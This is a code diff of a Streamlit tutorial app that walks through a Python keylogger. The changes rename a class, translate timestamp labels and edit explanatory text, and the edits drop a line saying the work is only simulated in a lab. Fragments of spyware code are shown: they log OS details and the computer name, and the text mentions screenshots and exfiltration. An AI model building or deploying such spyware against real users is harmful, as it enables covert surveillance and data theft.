@@ -152,7 +152,7 @@ def page_2():
              
     """)
     
-    st.markdown("<h1 style='text-align: center;'>TL;DR</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: left;'>TL;DR</h1>", unsafe_allow_html=True)
     st.write("""
 While malware can be written in C/C++, PowerShell, Bash, or VBScript, this implementation uses **Python** for its simplicity and accessibility.
 More advanced components (e.g. rootkits) would likely require C/C++, but for our **keylogger**, we stick to Python.
@@ -251,7 +251,7 @@ class Keylogger:
     st.info("Now, let's see the second class used by the malware")
     
     sysinfo_code = r"""  
-class SysInfo:
+class Info_screen:
     def __init__(self, log_file_name, screen_file_name):
         self.log_file_name =  log_file_name
         self.screen_file_name =  screen_file_name
@@ -267,7 +267,7 @@ class SysInfo:
         log_file = os.path.join(file_path, self.log_file_name)
         name_target = os.environ.get('COMPUTERNAME')
         with open(log_file,'a') as f:
-            timestamp = datetime.datetime.now().strftime("Jour: %Y-%m-%d__Heure: %H-%M-%S")
+            timestamp = datetime.datetime.now().strftime("Day: %Y-%m-%d__Hour: %H-%M-%S")
             f.write(f"---OS INFORMATION -> {os_inf_gath} : {timestamp} => {name_target}\n")
         return log_file
     
@@ -302,10 +302,9 @@ class SysInfo:
     st.code(sysinfo_code, language="python")
     
     st.write("""
-              This module collects OS information in a file where the keylog will be placed and takes periodic screenshots using PIL.ImageGrab. 
-              Like with the keylogger, this is purely simulated in a local lab environment. The main goal here, is to have
-              as much information as we can. We can also exfiltrate files and directories but I will not do that for this keylogger..
-              Like the first code, we adjust it with new functions in order to prevent race conditions (very important).
+            This module collects OS information in a file where the keylog will be placed and takes periodic screenshots using PIL.ImageGrab. 
+            The main goal here, is to have as much information as we can. We can also exfiltrate files and directories but I will not do that for this keylogger.
+            Like the first code, we adjust it with new functions in order to prevent race conditions (very important).
              """)
     
     st.info("""Thread function are used due to the use of functions that run continuously.""")
